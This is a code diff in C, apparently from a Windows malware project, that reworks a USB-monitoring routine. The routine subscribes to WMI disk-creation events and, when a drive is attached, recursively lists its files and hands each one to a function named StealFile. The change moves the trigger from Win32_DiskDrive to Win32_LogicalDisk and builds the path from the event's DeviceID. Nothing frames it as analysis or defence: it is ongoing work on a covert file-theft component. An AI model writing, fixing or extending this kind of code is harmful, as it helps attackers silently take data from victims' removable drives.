@@ -1613,31 +1613,14 @@ VOID MonitorUsbCallback
 	_In_ PGLOBAL_CONFIG pConfig
 )
 {
-	WCHAR wszDriveList[0x100];
-	DWORD dwLength = 0;
-	DWORD i = 0;
-	LPWSTR lpLogicalDrive = NULL;
-	DWORD dwDriveType = 0;
+	LPWSTR lpDeviceID = NULL;
 
-	SearchMatchStrW(lpInput, L"DeviceID = \"\\\\\\\\.\\\\PHYSICALDRIVE", L"\";\n");
-	dwLength = GetLogicalDriveStringsW(_countof(wszDriveList), wszDriveList);
-	if (dwLength == 0) {
-		LOG_ERROR("GetLogicalDriveStringsW", GetLastError());
-		goto CLEANUP;
-	}
-
-	lpLogicalDrive = wszDriveList;
-	while (i < dwLength) {
-		dwDriveType = GetDriveTypeW(lpLogicalDrive);
-		if (dwDriveType == DRIVE_REMOVABLE) {
-			ListFileEx(lpLogicalDrive, LIST_RECURSIVELY | LIST_JUST_FILE, (LIST_FILE_CALLBACK)StealFile, pConfig);
-		}
-
-		i += lstrlenW(lpLogicalDrive) + 1;
-	}
+	lpDeviceID = SearchMatchStrW(lpInput, L"DeviceID = \"", L"\";\n");
+	lpDeviceID = StrCatExW(lpDeviceID, L"\\");
+	ListFileEx(lpDeviceID, LIST_RECURSIVELY | LIST_JUST_FILE, StealFile, pConfig);
 
 CLEANUP:
-	return;
+	FREE(lpDeviceID);
 }
 
 VOID MonitorUsb
@@ -1664,7 +1647,7 @@ VOID MonitorUsb
 CLEANUP:
 	return;*/
 	while (TRUE) {
-		RegisterAsyncEvent(L"Select * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_DiskDrive' AND (TargetInstance.InterfaceType='USB')", MonitorUsbCallback, pConfig);
+		RegisterAsyncEvent(L"Select * FROM __InstanceCreationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_LogicalDisk'", MonitorUsbCallback, pConfig);
 		Sleep(60000);
 	}
 }
